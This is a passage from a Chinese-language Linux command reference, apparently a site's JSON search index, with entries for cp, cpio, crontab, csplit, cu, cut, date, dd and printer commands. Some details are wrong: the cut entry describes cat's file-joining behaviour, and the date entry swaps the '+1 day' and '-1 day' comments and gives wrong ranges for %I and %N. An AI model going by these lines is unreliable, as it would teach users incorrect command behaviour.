/usr/zh\n```\n\n我们在Linux下使用cp命令复制文件时候，有时候会需要覆盖一些同名文件，覆盖文件的时候都会有提示：需要不停的按Y来确定执行覆盖。文件数量不多还好，但是要是几百个估计按Y都要吐血了，于是折腾来半天总结了一个方法：\n\n```shell\ncp aaa/* /bbb\n# 复制目录aaa下所有到/bbb目录下，这时如果/bbb目录下有和aaa同名的文件，需要按Y来确认并且会略过aaa目录下的子目录。\n\ncp -r aaa/* /bbb\n# 这次依然需要按Y来确认操作，但是没有忽略子目录。\n\ncp -r -a aaa/* /bbb\n# 依然需要按Y来确认操作，并且把aaa目录以及子目录和文件属性也传递到了/bbb。\n\n\\cp -r -a aaa/* /bbb\n# 成功，没有提示按Y、传递了目录属性、没有略过目录。\n```\n\n递归强制复制目录到指定目录中覆盖已存在文件\n\n```shell\ncp -rfb ./* ../backup\n# 将当前目录下所有文件，复制到当前目录的兄弟目录 backup 文件夹中\n```\n\n拷贝目录下的隐藏文件如 `.babelrc`\n\n```shell\ncp -r aaa/.* ./bbb\n# 将 aaa 目录下的，所有`.`开头的文件，复制到 bbb 目录中。\n\ncp -a aaa ./bbb/ \n# 记住后面目录最好的'/' 带上 `-a` 参数\n```\n\n复制到当前目录\n\n```shell\ncp aaa.conf ./\n# 将 aaa.conf 复制到当前目录\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cp"]},{"title":"【Linux 命令】cpio","url":"/linux-command/cpio/","content":"\n用来建立、还原备份档的工具程序\n\n## 补充说明\n\n**cpio命令** 主要是用来建立或者还原备份档的工具程序，cpio命令可以复制文件到归档包中，或者从归档包中复制文件。\n\n###  语法\n\n```shell\ncpio(选项)\n```\n\n###  选项\n\n```shell\n-0或--null：接受新增列控制字符，通常配合find指令的“-print0”参数使用；\n-a或--rest-access-time：重新设置文件的存取时间；\n-A或--append：附加到已存在的备份文档中，且这个备份文档必须存放在磁盘上，而不能放置于磁带机里；\n-b或--awap：此参数的效果和同时指定“-ss”参数相同；\n-B：将输入/输出的区块大小改成5210Bytes；\n-c：使用旧ASCII备份格式；\n-C<区块大小>或--io-size=<区块大小>：设置输入/输出的区块大小，单位是Byte；\n-d或--make-directories：如有需要cpio会自行建立目录；\n-E<范本文件>或--pattern-file=<范本文件>：指定范本文件，其内含有一个或多个范本样式，让cpio解开符合范本条件的文件，格式为每列一个范本样式；\n-f或--nonmatching：让cpio解开所有不符合范本条件的文件；\n-F<备份档>或--file=<备份档>：指定备份档的名称，用来取代标准输入或输出，也能借此通过网络使用另一台主机的保存设备存取备份档；\n-H<备份格式>：指定备份时欲使用的文件格式；\n-i或--extract：执行copy-in模式，还原备份档；\n-l<备份档>：指定备份档的名称，用来取代标准输入，也能借此通过网络使用另一台主机的保存设备读取备份档；\n-k：此参数将忽略不予处理，仅负责解决cpio不同版本间的兼容性问题；\n-l或--link：以硬连接的方式取代复制文件，可在copy-pass模式下运用；\n-L或--dereference：不建立符号连接，直接复制该连接所指向的原始文件；\n-m或preserve-modification-time：不去更改文件的更改时间；\n-M<回传信息>或--message=<回传信息>：设置更换保存媒体的信息；\n-n或--numeric-uid-gid：使用“-tv”参数列出备份档的内容时，若再加上参数“-n”，则会以用户识别和群组识别码替代拥有者和群组名称列出文件清单；\n-o或--create：执行copy-out模式，建立备份档；\n-O<备份档>：指定备份档的名称，用来取代标准输出，也能借此通过网络使用另一台主机的保存设备存放备份档；\n-p或--pass-through：执行copy-pass模式，略过备份步骤，直接将文件复制到目的目录；\n-r或--rename：当有文件名称需要更改时，采用互动模式；\n-R<拥有者><:/.><所属群组>或----owner<拥有者><:/.><所属群组>   在copy-in模式还原备份档，或copy-pass模式复制文件时，可指定这些备份，复制的文件的拥有者与所属群组；\n-s或--swap-bytes：交换每队字节的内容；\n-S或--swap-halfwords：交换每半个字节的内容；\n-t或--list：将输入的内容呈现出来；\n-u或--unconditional：置换所有文件，不论日期时间的新旧与否，皆不予询问而直接覆盖；\n-v或--verbose：详细显示指令的执行过程；\n-V或--dot：执行指令时。在每个文件的执行程序前面加上“.”号；\n--block-size=<区块大小>：设置输入/输出的区块大小，假如设置数值为5，则区块大小为2500，若设置成10，则区块大小为5120，以此类推；\n--force-local：强制将备份档存放在本地主机；\n--help：在线帮助；\n--no-absolute-filenames：使用相对路径建立文件名称；\n--no-preserve-owner：不保留文件的拥有者，谁解开了备份档，那些文件就归谁所有；\n-only-verify-crc：当备份档采用CRC备份格式时，可使用这项参数检查备份档内的每个文件是否正确无误；\n--quiet：不显示复制了多少区块；\n--sparse：倘若一个文件内含有大量的连续0字节，则将此文件存在稀疏文件；\n--version：显示版本信息。\n```\n\n###  实例\n\n**将`/etc`下的所有普通文件都备份到`/opt/etc.cpio`，使用以下命令：** \n\n```shell\nfind /etc –type f | cpio –ocvB >/opt/etc.cpio\n```\n\n**将系统上所有资料备份到磁带机内，使用以下命令：** \n\n```shell\nfind / -print | cpio -covB > /dev/st0\n```\n\n这里的`/dev/st0`是磁带的设备名，代表SCSI磁带机。\n\n**查看上例磁带机上备份的文件，使用以下命令：** \n\n```shell\ncpio  -icdvt < /dev/st0 > /tmp/st_content\n```\n\n有时可能因为备份的文件过多，一个屏幕无法显示完毕，此时我们利用下面命令，让磁带机的文件信息输出到文件。\n\n**将示例1中的备份包还原到相应的位置，如果有相同文件进行覆盖，使用以下命令：** \n\n```shell\ncpio –icduv < /opt/etc.cpio\n```\n\n注意，cpio恢复的路径，如果cpio在打包备份的时候用的是绝对路径，那么在恢复的时候会自动恢复到这些绝对路径下，本例就会将备份文件全部还原到/etc路径下对应的目录中。同理，如果在打包备份用的是相对路径，还原时也将恢复到相对路径下。\n\n通过上面的示例，可以看出，cpio无法直接读取文件，它需要每个文件或者目录的完整路径名才能识别读取，而find命令的输出刚好做到了这点，因此，cpio命令一般和find命令配合使用。其实，上面的示例我们已经看到了它们的组合用法。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cpio"]},{"title":"【Linux 命令】crontab","url":"/linux-command/crontab/","content":"\n提交和管理用户的需要周期性执行的任务\n\n## 补充说明\n\n**crontab命令** 被用来提交和管理用户的需要周期性执行的任务，与windows下的计划任务类似，当安装完成操作系统后，默认会安装此服务工具，并且会自动启动crond进程，crond进程每分钟会定期检查是否有要执行的任务，如果有要执行的任务，则自动执行该任务。\n\n###  语法\n\n```shell\ncrontab(选项)(参数)\n```\n\n###  选项\n\n```shell\n-e：编辑该用户的计时器设置；\n-l：列出该用户的计时器设置；\n-r：删除该用户的计时器设置；\n-u<用户名称>：指定要设定计时器的用户名称。\n```\n\n###  参数\n\ncrontab文件：指定包含待执行任务的crontab文件。\n\n###  知识扩展\n\nLinux下的任务调度分为两类： **系统任务调度** 和 **用户任务调度** 。\n\n **系统任务调度：** 系统周期性所要执行的工作，比如写缓存数据到硬盘、日志清理等。在`/etc`目录下有一个crontab文件，这个就是系统任务调度的配置文件。\n\n`/etc/crontab`文件包括下面几行：\n\n```shell\nSHELL=/bin/bash\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=\"\"HOME=/\n\n# run-parts\n51 * * * * root run-parts /etc/cron.hourly\n24 7 * * * root run-parts /etc/cron.daily\n22 4 * * 0 root run-parts /etc/cron.weekly\n42 4 1 * * root run-parts /etc/cron.monthly\n```\n\n前四行是用来配置crond任务运行的环境变量，第一行SHELL变量指定了系统要使用哪个shell，这里是bash，第二行PATH变量指定了系统执行命令的路径，第三行MAILTO变量指定了crond的任务执行信息将通过电子邮件发送给root用户，如果MAILTO变量的值为空，则表示不发送任务执行信息给用户，第四行的HOME变量指定了在执行命令或者脚本时使用的主目录。\n\n **用户任务调度：** 用户定期要执行的工作，比如用户数据备份、定时邮件提醒等。用户可以使用 crontab 工具来定制自己的计划任务。所有用户定义的crontab文件都被保存在`/var/spool/cron`目录中。其文件名与用户名一致，使用者权限文件如下：\n\n```shell\n/etc/cron.deny     该文件中所列用户不允许使用crontab命令\n/etc/cron.allow    该文件中所列用户允许使用crontab命令\n/var/spool/cron/   所有用户crontab文件存放的目录,以用户名命名\n```\n\ncrontab文件的含义：用户所建立的crontab文件中，每一行都代表一项任务，每行的每个字段代表一项设置，它的格式共分为六个字段，前五段是时间设定段，第六段是要执行的命令段，格式如下：\n\n```shell\nminute   hour   day   month   week   command     顺序：分 时 日 月 周\n```\n\n其中：\n\n*   minute： 表示分钟，可以是从0到59之间的任何整数。\n*   hour：表示小时，可以是从0到23之间的任何整数。\n*   day：表示日期，可以是从1到31之间的任何整数。\n*   month：表示月份，可以是从1到12之间的任何整数。\n*   week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。\n*   command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。\n\n在以上各个字段中，还可以使用以下特殊字符：\n\n*   星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。\n*   逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”\n*   中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”\n*   正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。\n\n**crond服务** \n\n```shell\n/sbin/service crond start    # 启动服务\n/sbin/service crond stop     # 关闭服务\n/sbin/service crond restart  # 重启服务\n/sbin/service crond reload   # 重新载入配置\n```\n\n查看crontab服务状态：\n\n```shell\nservice crond status\n```\n\n手动启动crontab服务：\n\n```shell\nservice crond start\n```\n\n查看crontab服务是否已设置为开机启动，执行命令：\n\n```shell\nntsysv\n```\n\n加入开机自动启动：\n\n```shell\nchkconfig –level 35 crond on\n```\n\n###  实例\n\n每1分钟执行一次command\n\n```shell\n* * * * * command\n```\n\n每小时的第3和第15分钟执行\n\n```shell\n3,15 * * * * command\n```\n\n在上午8点到11点的第3和第15分钟执行\n\n```shell\n3,15 8-11 * * * command\n```\n\n每隔两天的上午8点到11点的第3和第15分钟执行\n\n```shell\n3,15 8-11 */2 * * command\n```\n\n每个星期一的上午8点到11点的第3和第15分钟执行\n\n```shell\n3,15 8-11 * * 1 command\n```\n\n每晚的21:30重启smb \n\n```shell\n30 21 * * * /etc/init.d/smb restart\n```\n\n每月1、10、22日的4 : 45重启smb \n\n```shell\n45 4 1,10,22 * * /etc/init.d/smb restart\n```\n\n每周六、周日的1:10重启smb\n\n```shell\n10 1 * * 6,0 /etc/init.d/smb restart\n```\n\n每天18 : 00至23 : 00之间每隔30分钟重启smb \n\n```shell\n0,30 18-23 * * * /etc/init.d/smb restart\n```\n\n每星期六的晚上11:00 pm重启smb \n\n```shell\n0 23 * * 6 /etc/init.d/smb restart\n```\n\n每一小时重启smb \n\n```shell\n* */1 * * * /etc/init.d/smb restart\n```\n\n晚上11点到早上7点之间，每隔一小时重启smb\n\n```shell\n* 23-7/1 * * * /etc/init.d/smb restart\n```\n\n每月的4号与每周一到周三的11点重启smb \n\n```shell\n0 11 4 * mon-wed /etc/init.d/smb restart\n```\n\n一月一号的4点重启smb\n\n```shell\n0 4 1 jan * /etc/init.d/smb restart\n```\n\n每小时执行`/etc/cron.hourly`目录内的脚本\n\n```shell\n01 * * * * root run-parts /etc/cron.hourly\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","crontab"]},{"title":"【Linux 命令】csplit","url":"/linux-command/csplit/","content":"\n将一个大文件分割成小的碎片文件\n\n## 补充说明\n\n**csplit命令** 用于将一个大文件分割成小的碎片，并且将分割后的每个碎片保存成一个文件。碎片文件的命名类似“xx00”，“xx01”。csplit命令是split的一个变体，split只能够根据文件大小或行数来分割，但csplit能够根据文件本身特点来分割文件。\n\n###  语法\n\n```shell\ncsplit(选项)(参数)\n```\n\n###  选项\n\n```shell\n-b<输出格式>或--suffix-format=<输出格式>：预设的输出格式其文件名称为xx00，xx01等，用户可以通过改变<输出格式>来改变输出的文件名；\n-f<输出字首字符串>或--prefix=<输出字首字符串>：预设的输出字首字符串其文件名为xx00，xx01等，如果制定输出字首字符串为“hello”，则输出的文件名称会变成hello00，hello、01......\n-k或--keep-files：保留文件，就算发生错误或中断执行，与不能删除已经输出保存的文件；\n-n<输出文件名位数>或--digits=<输出文件名位数>：预设的输出文件名位数其文件名称为xx00，xx01......如果用户指定输出文件名位数为“3”，则输出的文件名称会变成xx000，xx001等；\n-q或-s或--quiet或——silent：不显示指令执行过程；\n-z或--elide-empty-files：删除长度为0 Byte文件。\n```\n\n###  参数\n\n*   文件：指定要分割的原文件；\n*   模式：指定要分割文件时的匹配模式。\n\n###  实例\n\n示例测试文件 server.log\n\n```shell\ncat server.log\nSERVER-1\n[con] 10.10.10.1 suc\n[con] 10.10.10.2 fai\n[dis] 10.10.10.3 pen\n[con] 10.10.10.4 suc\nSERVER-2\n[con] 10.10.10.5 suc\n[con] 10.10.10.6 fai\n[dis] 10.10.10.7 pen\n[con] 10.10.10.8 suc\nSERVER-3\n[con] 10.10.10.9 suc\n[con] 10.10.10.10 fai\n[dis] 10.10.10.11 pen\n[con] 10.10.10.12 suc\n```\n\n需要将server.log分割成server1.log、server2.log、server3.log，这些文件的内容分别取自原文件中不同的SERVER部分：\n\n```shell\n[root@localhost split]# csplit server.log /SERVER/ -n2 -s {*} -f server -b \"%02d.log\"; rm server00.log\n[root@localhost split]# ls\nserver01.log  server02.log  server03.log  server.log\n```\n\n **命令详细说明：** \n\n```shell\n/[正则表达式]/   #匹配文本样式，比如/SERVER/，从第一行到包含SERVER的匹配行。\n{*}     #表示根据匹配重复执行分割，直到文件尾停止，使用{整数}的形式指定分割执行的次数。\n-s      #静默模式，不打印其他信息。\n-n      #指定分割后的文件名后缀的数字个数。比如01、02、03等。\n-f      #指定分割后的文件名前缀。\n-b      #指定后缀格式。比如%02d.log，类似于C语言中的printf参数格式。\nrm server00.log    #是删除第一个文件，因为分割后的的第一个文件没有内容，匹配的单词就位于文件的第一行中。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","csplit"]},{"title":"【Linux 命令】cu","url":"/linux-command/cu/","content":"\n用于连接另一个系统主机\n\n## 补充说明\n\n**cu命令** 用于连接另一个系统主机。cu(call up)指令可连接另一台主机，并采用类似拨号终端机的接口工作，也可执行简易的文件传输作业。\n\n###  语法\n\n```shell\ncu [dehnotv][-a<通信端口>][-c<电话号码>][-E<脱离字符>][-I<设置文件>][-l<外围设备代号>]\n[-s<连线速率>][-x<排错模式>][-z<系统主机>][--help][-nostop][--parity=none][<系统主机>/<电话号码>]\n```\n\n###  选项\n\n```shell\n-a<通信端口>或-p<通信端口>或--port<通信端口> 使用指定的通信端口进行连线。\n-c<电话号码>或--phone<电话号码> 拨打该电话号码。\n-d 进入排错模式。\n-e或--parity=even 使用双同位检查。\n-E<脱离字符>或--escape<脱离字符> 设置脱离字符。\n-h或--halfduple 使用半双工模式。\n-I<配置文件>或--config<配置文件> 指定要使用的配置文件。\n-l<外围设备代号>或--line<外围设备代号> 指定某项外围设备，作为连接的设备。\n-n或--prompt 拨号时等待用户输入电话号码。\n-o或--parity=odd 使用单同位检查。\n-s<连线速率>或--speed<连线速率>或--baud<连线速率>或-<连线速率> 设置连线的速率，单位以鲍率计算。\n-t或--maper 把CR字符置换成LF+CR字符。\n-v或--version 显示版本信息。\n-x<排错模式>或--debug<排错模式> 使用排错模式。\n-z<系统主机>或--system<系统主机> 连接该系统主机。\n--help 在线帮助。\n--nostop 关闭Xon/Xoff软件流量控制。\n--parity=none 不使用同位检查。\n```\n\n### 实例\n\n与远程主机连接\n\n```shell\ncu -c 0102377765\ncu -s 38400 9=12015551234\n```\n\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cu"]},{"title":"【Linux 命令】cupsdisable","url":"/linux-command/cupsdisable/","content":"\n停止指定的打印机\n\n## 补充说明\n\n**cupsdisable命令** 用于停止指定的打印机。\n\n###  语法\n\n```shell\ncupsdisable(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-u：指定打印任务所属的用户；\n-c：取消指定打印机的所有打印任务；\n-h：指定连接的服务器名和端口号；\n-r：停止打印机的原因。\n```\n\n###  参数\n\n目标：指定目标打印机。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cupsdisable"]},{"title":"【Linux 命令】cupsenable","url":"/linux-command/cupsenable/","content":"\n启动指定的打印机\n\n## 补充说明\n\n**cupsenable命令** 用于启动指定的打印机。\n\n###  语法\n\n```shell\ncupsenable(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-u：指定打印任务所属的用户；\n-h：指定连接的服务器名和端口号；\n```\n\n###  参数\n\n目标：指定目标打印机。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cupsenable"]},{"title":"【Linux 命令】cut","url":"/linux-command/cut/","content":"\n连接文件并打印到标准输出设备上\n\n## 补充说明\n\n**cut 命令** 用来显示行中的指定部分，删除文件中指定字段。cut 经常用来显示文件的内容，类似于 type 命令。\n\n说明：该命令有两项功能，其一是用来显示文件的内容，它依次读取由参数 file 所指 明的文件，将它们的内容输出到标准输出上；其二是连接两个或多个文件，如`cut fl f2 > f3`将把文件 fl 和 f2 的内容合并起来，然后通过输出重定向符“>”的作用，将它们放入文件 f3 中。\n\n当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用 more 等命令分屏显示。为了控制滚屏，可以按 Ctrl+S 键，停止滚屏；按 Ctrl+Q 键可以恢复滚屏。按 Ctrl+C（中断）键可以终止该命令的执行，并且返回 Shell 提示符状态。\n\n### 语法\n\n```shell\ncut（选项）（参数）\n```\n\n### 选项\n\n```shell\n-b：仅显示行中指定直接范围的内容；\n-c：仅显示行中指定范围的字符；\n-d：指定字段的分隔符，默认的字段分隔符为“TAB”；\n-f：显示指定字段的内容；\n-n：与“-b”选项连用，不分割多字节字符；\n--complement：补足被选择的字节、字符或字段；\n--out-delimiter= 字段分隔符：指定输出内容是的字段分割符；\n--help：显示指令的帮助信息；\n--version：显示指令的版本信息。\n```\n\n### 参数\n\n文件：指定要进行内容过滤的文件。\n\n### 实例\n\n例如有一个学生报表信息，包含 No、Name、Mark、Percent：\n\n```shell\n[root@localhost text]# cat test.txt\nNo Name Mark Percent\n01 tom 69 91\n02 jack 71 87\n03 alex 68 98\n\n```\n\n使用  **-f**  选项提取指定字段（这里的 f 参数可以简单记忆为 `--fields`的缩写）：\n\n```shell\n[root@localhost text]# cut -f 1 test.txt\nNo\n01\n02\n03\n```\n\n```shell\n[root@localhost text]# cut -f2,3 test.txt\nName Mark\ntom 69\njack 71\nalex 68\n\n```\n\n **--complement**  选项提取指定字段之外的列（打印除了第二列之外的列）：\n\n```shell\n[root@localhost text]# cut -f2 --complement test.txt\nNo Mark Percent\n01 69 91\n02 71 87\n03 68 98\n```\n\n使用  **-d**  选项指定字段分隔符：\n\n```shell\n[root@localhost text]# cat test2.txt\nNo;Name;Mark;Percent\n01;tom;69;91\n02;jack;71;87\n03;alex;68;98\n```\n\n```shell\n[root@localhost text]# cut -f2 -d\";\" test2.txt\nName\ntom\njack\nalex\n\n```\n\n### 指定字段的字符或者字节范围\n\ncut 命令可以将一串字符作为列来显示，字符字段的记法：\n\n* **N-** ：从第 N 个字节、字符、字段到结尾；\n* **N-M** ：从第 N 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段；\n* **-M** ：从第 1 个字节、字符、字段到第 M 个（包括 M 在内）字节、字符、字段。\n\n上面是记法，结合下面选项将摸个范围的字节、字符指定为字段：\n\n* **-b**  表示字节；\n* **-c**  表示字符；\n* **-f**  表示定义字段。\n\n**示例**\n\n```shell\n[root@localhost text]# cat test.txt\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\nabcdefghijklmnopqrstuvwxyz\n\n```\n\n打印第 1 个到第 3 个字符：\n\n```shell\n[root@localhost text]# cut -c1-3 test.txt\nabc\nabc\nabc\nabc\nabc\n\n```\n\n打印前 2 个字符：\n\n```shell\n[root@localhost text]# cut -c-2 test.txt\nab\nab\nab\nab\nab\n\n```\n\n打印从第 5 个字符开始到结尾：\n\n```shell\n[root@localhost text]# cut -c5- test.txt\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\nefghijklmnopqrstuvwxyz\n```\n\n<!-- Linux 命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cut"]},{"title":"【Linux 命令】date","url":"/linux-command/date/","content":"\n显示或设置系统时间与日期\n\n## 概要\n\n```shell\ndate [OPTION]... [+FORMAT]\ndate [-u|--utc|--universal] [MMDDhhmm[[CC]YY][.ss]]\n```\n\n## 主要用途\n\n- 转换时间到选定的格式，默认为当前。\n- 设置系统时间。\n\n## 参数\n\nformat：输出的时间格式。\n\n```shell\nformat可用的转义序列如下：\n\n%%      百分号\n%a      当地缩写的工作日名称（例如，Sun）\n%A      当地完整的工作日名称（例如，Sunday）\n%b      当地缩写的月份名称（例如，Jan）\n%B      当地完整的月份名称（例如，January）\n%c      当地的日期和时间（例如，Thu Mar  3 23:05:25 2005）\n%C      世纪，和%Y类似，但是省略后两位（例如，20）\n%d      一月中的一天（例如，01）\n%D      日期，等价于%m/%d/%y\n%e      一月中的一天，格式使用空格填充，等价于%_d\n%F      完整的日期；等价于%+4Y-%m-%d\n%g      ISO标准计数周的年份的最后两位数字\n%G      ISO标准计数周的年份，通常只对%V有用\n%h      等价于%b\n%H      小时，范围（00..23）\n%I      小时，范围（00..23）\n%j      一年中的一天，范围（001..366）\n%k      小时，使用空格填充，范围（0..23），等价于%_H\n%l      小时，使用空格填充，范围（1..12），等价于%_I\n%m      月，范围（01..12）\n%M      分钟，范围（00..59）\n%n      换行符\n%N      纳秒，范围（000000000..000000000）\n%p      用于表示当地的AM或PM，如果未知则为空白\n%P      类似于%p，但用小写表示\n%q      季度，范围（1..4）\n%r      当地以12小时表示的时钟时间（例如，11:11:04 PM）\n%R      24小时每分钟；等价于%H:%M\n%s      自协调世界时1970年01月01日00时00分以来的秒数\n%S      秒数，范围（00..60）\n%t      水平制表符\n%T      时间；等价于%H:%M:%S\n%u      一周中的一天（1..7），1代表星期一\n%U      一年中的第几周，周日作为一周的起始（00..53）\n%V      ISO标准计数周，该方法将周一作为一周的起始（01..53）\n%w      一周中的一天（0..6），0代表星期天\n%W      一年中的第几周，周一作为一周的起始（00..53）\n%x      当地的日期表示（例如，12/31/99）\n%X      当地的时间表示（例如，23:13:48）\n%y      年份后两位数字，范围（00..99）\n%Y      年份\n%z      +hhmm格式的数值化时区格式（例如，-0400）\n%:z     +hh:mm格式的数值化时区格式（例如，-04:00）\n%::z    +hh:mm:ss格式的数值化时区格式（例如，-04:00:00）\n%:::z   数值化时区格式，相比上一个格式增加':'以显示必要的精度（例如，-04，+05:30）\n%Z      时区缩写（如EDT）\n\n默认情况下，日期用零填充数字字段；以下可选的符号可以跟在'%'后面:\n\n-      (连字符) 不要填充相应的字段。\n_      (下划线) 使用空格填充相应的字段。\n0      (数字0) 使用数字0填充相应的字段。\n+      用数字0填充，未来年份大于4位数字则在前面加上'+'号。\n^      允许的情况下使用大写。\n#      允许的情况下将默认的大写转换为小写，默认的小写转换为大写。\n\n在任何标志之后都有一个可选的字段宽度，如小数；然后是一个可选的修饰符，在可用的情况下，使用E来使用当地语言环境的替代表示，\n使用O来使用当地语言环境的替代数字符号。\n```\n\n## 选项 \n\n```shell\n长选项与短选项等价\n\n-d, --date=STRING          解析字符串并按照指定格式输出，字符串不能是'now'。\n--debug                    注释已解析的日期，并将有疑问的用法发送到标准错误。\n-f, --file=DATEFILE        类似于--date; 一次从DATEFILE处理一行。\n-I[FMT], --iso-8601[=FMT]  按照ISO 8601格式输出，FMT可以为'date'(默认)，'hours'，'minutes'，'seconds'，'ns'。\n                           例如：2006-08-14T02:34:56-06:00\n-R, --rfc-email            按照RFC 5322格式输出，例如: Mon, 14 Aug 2006 02:34:56 -0600\n--rfc-3339=FMT             按照RFC 3339格式输出，FMT可以为'date', 'seconds','ns'中的一个，\n                           例如：2006-08-14 02:34:56-06:00\n-r, --reference=FILE       显示文件的上次修改时间。\n-s, --set=STRING           根据字符串设置系统时间。\n-u, --utc, --universal     显示或设置世界协调时(UTC)。\n--help                     显示帮助信息并退出。\n--version                  显示版本信息并退出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子 \n\n```shell\n# 格式化输出：\ndate +\"%Y-%m-%d\"\n2009-12-07\n\n# 输出昨天日期：\ndate -d \"1 day ago\" +\"%Y-%m-%d\"\n2012-11-19\n\n# 2秒后输出：\ndate -d \"2 second\" +\"%Y-%m-%d %H:%M.%S\"\n2012-11-20 14:21.31\n\n# 传说中的 1234567890 秒：\ndate -d \"1970-01-01 1234567890 seconds\" +\"%Y-%m-%d %H:%M:%S\"\n# 或者\ndate -d@1234567890 +\"%F %T\"\n# 输出结果\n2009-02-13 23:02:30\n\n# 时间格式转换：\ndate -d \"2009-12-12\" +\"%Y/%m/%d %H:%M.%S\"\n# 输出结果\n2009/12/12 00:00.00\n\n# apache格式转换：\ndate -d \"Dec 5, 2009 12:00:37 AM\" +\"%Y-%m-%d %H:%M.%S\"\n# 输出结果\n2009-12-05 00:00.37\n\n# 格式转换后时间游走：\ndate -d \"Dec 5, 2009 12:00:37 AM 2 year ago\" +\"%Y-%m-%d %H:%M.%S\"\n# 输出结果\n2007-12-05 00:00.37\n\n# 时间加减操作：\ndate +%Y%m%d                   # 显示年月日\ndate -d \"+1 day\" +%Y%m%d       # 显示前一天的日期\ndate -d \"-1 day\" +%Y%m%d       # 显示后一天的日期\ndate -d \"-1 month\" +%Y%m%d     # 显示上一月的日期\ndate -d \"+1 month\" +%Y%m%d     # 显示下一月的日期\ndate -d \"-1 year\" +%Y%m%d      # 显示前一年的日期\ndate -d \"+1 year\" +%Y%m%d      # 显示下一年的日期\n\n# 设定时间：\ndate -s                         # 设置当前时间，只有root权限才能设置，其他只能查看\ndate -s 20120523                # 设置成20120523，这样会把具体时间设置成00:00:00\ndate -s 01:01:01                # 设置具体时间，不会对日期做更改\ndate -s \"01:01:01 2012-05-23\"   # 这样可以设置全部时间\ndate -s \"01:01:01 20120523\"     # 这样可以设置全部时间\ndate -s \"2012-05-23 01:01:01\"   # 这样可以设置全部时间\ndate -s \"20120523 01:01:01\"     # 这样可以设置全部时间\n\n# 有时需要检查一组命令花费的时间：\nstart=$(date +%s)\nnmap wangchujiang.com &> /dev/null\nend=$(date +%s)\ndifference=$(( end - start ))\n# 显示执行时间\necho $difference seconds.\n\n# 当你考虑输出带有时间的字符串时，例如（Current time: 2019/05/19）：\n# 通常使用的方法：\necho \"Current time: $(date +\"%Y/%m/%d\")\"\n# 另一种方法：\nsuffix='Current time:'\n# 注意如果换成单引号就不能替换变量了。\ndate +\"${suffix} %Y/%m/%d\"\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 date`或`info coreutils 'date invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","date"]},{"title":"【Linux 命令】dd","url":"/linux-command/dd/","content":"\n复制文件并对原文件的内容进行转换和格式化处理\n\n## 补充说明\n\n**dd命令** 用于复制文件并对原文件的内容进行转换和格式化处理。dd命令功能很强大的，对于一些比较底层的问题，使用dd命令往往可以得到出人意料的效果。用的比较多的还是用dd来备份裸设备。但是不推荐，如果需要备份oracle裸设备，可以使用rman备份，或使用第三方软件备份，使用dd的话，管理起来不太方便。\n\n建议在有需要的时候使用dd 对物理磁盘操作，如果是文件系统的话还是使用tar backup cpio等其他命令更加方便。另外，使用dd对磁盘操作时，最好使用块设备文件。\n\n###  语法 \n\n```shell\ndd(选项)\n```\n\n###  选项 \n\n```shell\nbs=<字节数>：将ibs（输入）与obs（输出）设成指定的字节数；\ncbs=<字节数>：转换时，每次只转换指定的字节数；\nconv=<关键字>：指定文件转换的方式；\ncount=<区块数>：仅读取指定的区块数；\nibs=<字节数>：每次读取的字节数；\nobs=<字节数>：每次输出的字节数；\nof=<文件>：输出到文件；\nseek=<区块数>：一开始输出时，跳过指定的区块数；\nskip=<区块数>：一开始读取时，跳过指定的区块数；\n--help：帮助；\n--version：显示版本信息。\n```\n\n###  实例 \n\n```shell\n[root@localhost text]# dd if=/dev/zero of=sun.txt bs=1M count=1\n1+0 records in\n1+0 records out\n1048576 bytes (1.0 MB) copied, 0.006107 seconds, 172 MB/s\n\n[root@localhost text]# du -sh sun.txt \n1.1M    sun.txt\n```\n\n该命令创建了一个1M大小的文件sun.txt，其中参数解释：\n\n* **if**  代表输入文件。如果不指定if，默认就会从stdin中读取输入。\n* **of**  代表输出文件。如果不指定of，默认就会将stdout作为默认输出。\n* **bs**  代表字节为单位的块大小。\n* **count**  代表被复制的块数。\n* **/dev/zero**  是一个字符设备，会不断返回0值字节（\\0）。\n\n块大小可以使用的计量单位表\n\n单元大小 | 代码\n---- | ----\n字节（1B）| c\n字节（2B）| w\n块（512B）| b\n千字节（1024B） | k\n兆字节（1024KB）| M\n吉字节（1024MB）| G\n\n以上命令可以看出dd命令来测试内存操作速度：\n\n```shell\n1048576 bytes (1.0 MB) copied, 0.006107 seconds, 172 